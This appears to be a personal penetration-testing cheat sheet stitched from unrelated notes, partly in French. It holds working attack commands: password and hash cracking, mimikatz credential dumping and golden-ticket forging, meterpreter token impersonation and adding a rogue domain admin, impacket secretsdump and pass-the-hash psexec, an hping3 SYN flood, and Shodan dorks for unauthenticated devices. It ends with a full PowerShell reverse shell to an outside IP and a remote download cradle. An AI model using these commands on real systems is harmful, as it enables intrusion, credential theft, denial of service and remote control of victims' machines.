xargs -a database/lives.txt -P 50 -I % bash -c "echo % | aquatone -chrome-path $CHROME_BIN -out database/screenshots/ -threads 10 -silent" 2> /dev/null &> /dev/null




##-=================================-##
##     [+]  PureDNS - DNS Brute Forcing using puredns
##-=================================-##
	puredns bruteforce "Wordlists/dns/dns_2m.txt" "$target_domain" -r "Wordlists/dns/valid_resolvers.txt" -w "subs/dns_bf.txt" --skip-wildcard-filter --skip-validation &> /dev/null


##-==============================-##
##     [+]  PureDNS - resolving brute forced subs
##-==============================-##	
	puredns resolve "subs/dns_bf.txt" -r "Wordlists/dns/valid_resolvers.txt" -w "subs/dns_bf_resolved.txt"  --skip-wildcard-filter --skip-validation &> /dev/null


##-==============================-##
	##    [+]  Gotator - Permutations using gotator
##-==============================-##	
	gotator -sub "subs/dns_bf_resolved.txt" -perm "Wordlists/dns/dns_permutations_list.txt" -mindup -fast -silent | sort -u > "subs/permutations.txt"


##-=======================-##
##     [+]  Cero - TLS probing
##-=======================-##
	cero "$target_domain" | sed 's/^*.//' | grep  "\." | sort -u |  grep ".$target_domain$" > "subs/tls_probing.txt"


##-=====================================-##
##     [+]  HTTPX - Scraping (JS/Source) code
##-=====================================-##
cat "subs/"* | sort -u > "subs/filtered_subs.txt"
cat "subs/filtered_subs.txt" | httpx -random-agent -retries 2 -o "subs/filtered_hosts.txt" &> /dev/null


##-==================================-##
##     [+]  GoSpider - Subdomain Crawling
##-==================================-##
gospider -S "subs/filtered_hosts.txt" --js -t 50 -d 3 --sitemap --robots -w -r > "subs/gospider.txt"



##-====================================-##
##     [+]  Extracting subdomains from JS Files
##-=====================================-##
sed -i '/^.\{2048\}./d' "subs/gospider.txt"
cat "subs/gospider.txt" | grep -o 'https?://[^ ]+' | sed 's/]$//' | unfurl -u domains | grep "$target_domain" | sort -u > "subs/scrap_subs.txt"
rm "subs/gospider.txt"





https://github.com/EdOverflow/bugbounty-cheatsheet
https://github.com/projectdiscovery/dnsx
https://github.com/infosec-au/altdns
https://github.com/RoliSoft/ReconScan
https://github.com/carlospolop/legion
https://github.com/mostaphabahadou/postenum
https://hunter.io/
https://github.com/Findomain/Findomain

https://github.com/bugcrowd/templates


https://github.com/x0rz/EQGRP

https://github.com/wsargent/docker-cheat-sheet

https://github.com/vitalysim/Awesome-Hacking-Resources

https://github.com/s0md3v/AwesomeXSS

https://github.com/threatexpress/red-team-scripts

https://github.com/sektioneins/pcc/wiki

https://github.com/sergey-pronin/Awesome-Vulnerability-Research

https://github.com/onlurking/awesome-infosec

https://github.com/NoorQureshi/kali-linux-cheatsheet

https://github.com/nnamon/linux-exploitation-course

https://github.com/meirwah/awesome-incident-response

https://github.com/leostat/rtfm

https://github.com/kbandla/APTnotes

https://github.com/FuzzySecurity/Resource-List

https://github.com/emilyanncr/Windows-Post-Exploitation

https://github.com/FabioBaroni/awesome-exploit-development

https://github.com/enddo/awesome-windows-exploitation

https://github.com/enaqx/awesome-pentest

https://github.com/dostoevskylabs/dostoevsky-pentest-notes

https://github.com/EdOverflow/bugbounty-cheatsheet


##-========================-##
##     [+]  Password Cracking
##-========================-##

 
##-========================-##
##     [+] Cracking Zip Archives:
##-========================-##
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip 


##-===================================-##
##     [+] JohnTheRippr - Cracking /etc/shadow
##-===================================-##
unshadow passwd shadow > passwords
john --wordlist=/usr/share/wordlists/rockyou.txt passwords



##-===================================-##
##     [+] JohnTheRippr - Cracking Keepass 
##-===================================-##
keepass2john /root/Desktop/NewDatabase.kdb > file
john -incremental:alpha -format=keepass file


##-===============================-##
##     [+] Bruteforce Salted Passwords 
##-===============================-##


for j in $(cat cipher); do 
echo $j; 
for i in $(cat digestion); 
do /root/Documents/HTB/Hawk/bruteforce-salted-openssl/bruteforce-salted-openssl -t 10 -f /usr/share/wordlists/rockyou.txt -c $j -d $i ../miau.txt -1 2>&1 | grep "candidate" ; done ; done


openssl aes-256-cbc -d -in ../miau.txt -out result.txt -k friends






https://github.com/frizb/Hashcat-Cheatsheet


https://github.com/kobs0N/Hacking-Cheatsheet/tree/master/CobaltStrike

https://gist.github.com/jeremypruitt?page=4

https://gist.github.com/jeremypruitt/66eb1f65a4b6599f560de30ca7b5fdea

https://gist.github.com/jeremypruitt/c041d355514a8762ababf6458f7b26fd

https://gist.github.com/jeremypruitt/6bea3bfa10b5aabd288099ca8115b463

https://gist.github.com/jeremypruitt/3716b90e722dd1c61dd32c77bfdab22d

https://github.com/Ignitetechnologies/Web-Application-Cheatsheet

https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets

https://gist.github.com/tuxfight3r/9ac030cb0d707bb446c7

https://gist.github.com/jforge/27962c52223ea9b8003b22b8189d93fb

https://gist.github.com/githubfoam/4d3c99383b5372ee019c8fbc7581637d




##  binwalk - extract hidden files

binwalk --dd='.*' flag2.jpeg


##  Hexdump - 

hexdump -C $file.txt


##  Steghide - 

steghide extract -sf image.jpg 


stegcracker -> to crack steghide passwords

stegcracker Challenge2.jpeg /usr/share/wordlist/rockyou.txt
 

##  [?] https://georgeom.net/StegOnline


##  fcrackzip : Crack zip files 

fcrackzip -m 1 -D -p /usr/share/wordlist/rockyou.txt -v $File.zip



##  John - crack zip file

zip2john file.zip > zip.hash

john --wordlist=/usr/share/wordlist/rockyou.txt zip.hash



hashcat -a 0 -m 160 hashes.txt --force /usr/share/wordlist/rockyou.txt  avec dans hashes.txt -> e5d8870e5bdd26602cab8dbe07a942c8669e56d6:tryhackme


mimikatz (hash dumping) : dump hashes -> lsadump::lsa /patch


rarcrack --type rar /$Dir/$File.rar

rarcrack --type zip /$Dir/$File.zip

rarcrack --type 7z /$Dir/$File.7z



hping3 --flood -p $Port -S $SrcIP

hping3 --flood -p 80 -S 192.168.1.1




mimikatz Examples

###### Generate TGS with NTLM
kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<NTLMHASH> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>


###### Generate TGS with AES 128bit Key
kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>


###### Generate TGS with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)
kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>


###### Inject TGS with Mimikatz
kerberos::ptt <KIRBI_FILE>



Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonPasswords full

Meterpreter
meterpreter> run winenum
meterpreter> use post/windows/gather/smart_hashdump

meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token TVM\domainadmin
meterpreter > add_user hacker password1 -h 192.168.0.10
meterpreter > add_group_user "Domain Admins" hacker -h 192.168.0.10

meterpreter > load mimikatz
meterpreter > wdigest
meterpreter > getWdigestPasswords






use modules/pivoting/3proxy
run

use modules/pivoting/meterssh
run

use modules/pivoting/pivoter
run

use modules/pivoting/rpivot
run

use modules/av-bypass/pyobfuscate
run

use modules/exploitation/fido
run

use modules/exploitation/fuxploider
run

use modules/exploitation/impacket
run

use modules/exploitation/inception
run

use modules/exploitation/kerberoast
run

use modules/exploitation/mitm6
run

use modules/exploitation/pwntools
run

use modules/webshells/b374k
run

use modules/webshells/blackarch
run

use modules/webshells/wso
run

use modules/intelligence-gathering/amass
run

use modules/intelligence-gathering/autorecon
run

use modules/intelligence-gathering/awsbucket
run

use modules/intelligence-gathering/massdns
run

use modules/intelligence-gathering/windows-exploit-suggester
run

use modules/password-recovery/statistically-likely-usernames
run

use modules/post-exploitation/donut
run

use modules/post-exploitation/evilwinrm
run

use modules/vulnerability-analysis/golismero
run

use modules/powershell/obfuscation
run

use modules/powershell/powersccm
run









### Impacket


impacket-atexec -k -no-pass <DOMAIN>/Administrator@<DOMAIN_CONTROLLER>.<DOMAIN> 'type C:\PATH\TO\FILE\<FILE>'


impacket-GetADUsers -all -dc-ip <RHOST> <DOMAIN>/


impacket-getST <DOMAIN>/<USERNAME>$ -spn WWW/<DOMAIN_CONTROLLER>.<DOMAIN> -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator


impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>


impacket-netview <DOMAIN>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /PATH/TO/FILE/<FILE>.txt


impacket-reg <DOMAIN>/<USERNAME>:<PASSWORD:PASSWORD_HASH>@<RHOST> <ACTION> <ACTION>


impacket-rpcdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>



impacket-samrdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>



impacket-services <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST> <ACTION>



impacket-smbpasswd <RHOST>/<USERNAME>:'<PASSWORD>'@<RHOST> -newpass '<PASSWORD>'



impacket-smbserver local . -smb2support


##### impacket-smbclient
export KRB5CCNAME=<USERNAME>.ccache


impacket-smbclient <RHOST>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>


impacket-smbclient -k <RHOST>/<USERNAME>@<RHOST>.<RHOST> -no-pass


##### impacket-getTGT

impacket-getTGT <RHOST>/<USERNAME>:<PASSWORD>



impacket-getTGT <RHOST>/<USERNAME> -dc-ip <RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c


##### impacket-GetNPUsers

impacket-GetNPUsers <RHOST>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast


impacket-GetNPUsers <RHOST>/<USERNAME> -request -no-pass -dc-ip <RHOST>


impacket-GetNPUsers <RHOST>/ -usersfile usernames.txt -format john -outputfile hashes


##### impacket-getUserSPNs
export KRB5CCNAME=<USERNAME>.ccache


impacket-GetUserSPNs <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<RHOST> -no-pass -request


##### impacket-secretsdump
export KRB5CCNAME=<USERNAME>.ccache


impacket-secretsdump <RHOST>/<USERNAME>@<RHOST>


impacket-secretsdump -k <RHOST>/<USERNAME>@<RHOST>.<RHOST> -no-pass -debug


impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash


impacket-secretsdump -dc-ip <RHOST> <RHOST>.LOCAL/svc_bes:<PASSWORD>@<RHOST>


impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL


##### impacket-psexec
impacket-psexec <USERNAME>@<RHOST>


impacket-psexec <RHOST>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18





.
## Shodan
 https://help.shodan.io/command-line-interface/0-installation

##  [+] Shodan - Initialising
shodan init $APIKey

#####  [+] Shodan - Searches

$ shodan search 'ASN:AS<ASN>'

$ shodan search 'ASN:AS$ASN> has_vuln:true'

$ shodan search --fields ip_str,port,org,hostnames 'asn:<ASN>'

$ shodan search --fields ip_str,port,org,hostnames 'asn:<ASN> port:443'

$ shodan search --fields ip_str,port,org,hostnames 'asn:<ASN> vuln:cve-2021-40449'

$ shodan stats --facets ssl.version asn:<ASN> has_ssl:true http

$ shodan domain <DOMAIN>

$ shodan honeyscore <RHOST>

$ shodan count vuln:cve-2021-40449

$ shodan stats --facets vuln country:US                       //##  [+] Shodan - top 10 vulnerabilities in Americak

$ shodan search 'd-Link Internet Camera, 200 OK'  
            
##  [+] Shodan -d-link cameras
$ shodan search '230 login successful port:21'                // ftp access

$ shodan search 'product:MySQL'                               // ##  [+] Shodan -mysql databases
$ shodan search 'port:9200 json'                              // ##  [+] Shodan -elastic search

##  [+] Shodan - hacked routers

shodan search 'hacked-router-help-sos'                     

##  [+] Shodan -all storage devices                attached storages
shodan search 'IPC$ 

##  [+] Shodan -vnc servers without authentication:

shodan search '"authentication disabled" port:5900,5901' 


shodan search 'http.favicon.hash:81586312'                  // default jenkins installations


##  [+] Shodan - Dorks

hostname:<DOMAIN>
http.title:"title"
http.html:"/file"
html:"context"
server: "apache 2.2.3"
asn:AS<ASN>
http.status:200
http.favicon.hash:"<HASH>"
port:"23"
mysql port:"3306"
proftpd port:21
os:"Linux"
os"windows 7
country:"UK"
"city: London"
product:"nginx"
Server: SQ-WEBCAM
title:"xzeres wind"
Ssl.cert.subject.CN:"<DOMAIN>" -http.title:"Invalid URL" 200
geo:"51.5074, 0.1278"
port:5432 PostgreSQL
port:"25" product:"exim"
os:"Windows 10 Home 19041"
"port: 53" Recursion: Enabled
"MongoDB Server Information" port:27017 -authentication
"Set-Cookie: mongo-express=" "200 OK"
port:"9200" all:"elastic indices"
"220" "230 Login successful." port:21
port:"11211" product:"Memcached"
"X-Jenkins" "Set-Cookie: JSESSIONID" http.title:"Dashboard"
port:8291 os:"MikroTik RouterOS 6.45.9"
product:"Apache httpd" port:"80"
product:"Microsoft IIS httpd"
"port: 8080" product:"nginx"
ssl.cert.issuer.cn:example.com ssl.cert.subject.cn:example.com
ssl.cert.expired:true
"Server: yawcam" "Mime-Type: text/html"
port:5006,5007 product:mitsubishi
"Server: gSOAP/2.8" "Content-Length: 583"
"authentication disabled" "RFB 003.008"
"Authentication: disabled" port:445
"X-Plex-Protocol" "200 OK" port:32400
"220" "230 Login successful." port:21
"Serial Number:" "Built:" "Server: HP HTTP"
"SERVER: EPSON_Linux UPNP" "200 OK"



##  [+] Shodan - Creating Alert

 shodan alert create $Name <XXX.XXX.XXX.XXX/XX> && shodan stream --alerts=all


##  [+] Shodan - Parsing Script


#!/bin/bash

input="hosts.txt"

while read -r line
do
 shodan host $line; sleep 3
done < "$input"


### API Calls

curl -s https://api.shodan.io/api-info?key=$APIKey | jq

curl -s https://api.shodan.io/shodan/host/1.1.1.1?key=$APIKey | jq


## Shodan to Nuclei

shodan search vuln:CVE-2021-26855 --fields ip_str,port --separator " "
 | awk '{print $1":"$2}'
 | httprobe
 | nuclei -t /PATH/TO/TEMPLATES/CVE/2021/CVE-2021-26855.yaml


### Web Search

<product> city:"<CITY>"
"Server: gws" hostname:"google"
cisco net:"216.219.143.0/24"
Apache city:"<CITY>" port:"8080" product:"Apache Tomcat/Coyote JSP engine"







POWERSHELL : 

Une commande est appelée cmdlet. Et pour chaqu cmdlet sa sortie est un objet avec lequel on peut intéragir

Get — To get something
Start — To run/n something
Out — To output something
Stop — To stop something that is running
Set — To define something
New — To create something

- Lister les commandes : Get-Command
- Obtenir l'aide pour une commande : Get-Help command (-Examples en plus pour avoir des exemples)
- Les patterns fonctionnent -> Get-Command New-*
- Utilisation du pipe pour passer un objet à une commande -> exemple d'affichage des commandes qui sont des méthodes -> Get-Command | Get-Member -MemberType Method
- Créer des objets à partir d'autres : Select-Object cmdlet -> exemple pour lister un répertoire et n'afficher que le mode et le nom : Get-ChildItem | Select-Object -Property Mode, Name
- Filtrer des object avec Where-Object : exemple -> Get-Service | Where-Object -Property Status -eq Stopped -> va afficher les services qui ont pour statut "Stopped"
- Trier les objets avec Sort-Object -> Get-ChildItem | Sort-Object

Find file by name recursively and print the full path:
Get-ChildItem -Path C:\ -Include interesting-file.* -File -Recurse -ErrorAction SilentlyContinue
Using include we must use * 

Print file content :
Get-Content -Path "C:\Program Files\interesting-file.txt.txt"

Count all cmdlet commands :
Get-Command -CommandType cmdlet | measure

Get md5 hash of a file :
Get-FileHash -Algorithm MD5 -Path "C:\Program Files\interesting-file.txt.txt"

Get the current directory :
Get-Location

Check if path exists :
Test-Path "C:\Users\Administrator\Documents\Passwords" -> False

Decode b64 file : 

Get-ChildItem -Path "C:\" -Recurse -ErrorAction SilentlyContinue -File -Include b64.tx* -> C:\Users\Administrator\Desktop\b64.txt
$string = Get-Content -Path C:\Users\Administrator\Desktop\b64.txt

(to verify the content of $string we can print the content -> Write-Output $string)
[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($string))

List local users :
Get-LocalUser

Get IP address :
Get-NetIPAddress

Get ports listening :
Get-NetTCPConnection -State Listen

Print the remote address of the local port listening on port 445 :
Get-NetTCPConnection -State Listen -LocalPort 445 | Format-List -Property RemoteAddress

Get the hot fixes (patchs) :
Get-HotFix

Grep a string in file :
Get-ChildItem -Path C:\ -Recurse | Select-String -Pattern API_KEY

List processus :
Get-Process

List the scheduled tasks :
Get-ScheduledTask

Get directory / file owner infos :
Get-Acl -Path C:\

Instead of using Format-List to print the desired informations we can select what we want with the value we want : 
Get-LocalUser | Select-Object *  -> prints all the properties of all users. If we want to get only the field "PasswordRequired" :
Get-LocalUser | Select-Object -Property PasswordRequired

To get only the value of PasswordRequired set to false :
Get-LocalUser | Select-Object -ExpandProperty PasswordRequired | Select-String "False"
For a file Select-String can also search for a specific string inside a file

To read input from user :
$var = Read-Host -Prompt "Text to print"

To test if a port is open :
Test-NetConnection ip -Port port_number

Simple local port scanner :
$ip = "localhost"

for($i = 130; $i -lt 141;$i++){
    if((Test-NetConnection $ip -Port $i -WarningAction SilentlyContinue| Select -Property TcpTestSucceeded) -match "True"){
        echo $i
    }
}

Download a file:
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://ip/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
The -c option execute the command




Reverse shell TCP :

#Set the target
$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443); 
#Set the stream
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};

#while data is coming execute and send back command result
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String );
	$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush();
} $client.Close();

One-liner -> $client = New-Object System.Net.Sockets.TCPClient('192.168.1.16',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();} $client.Close();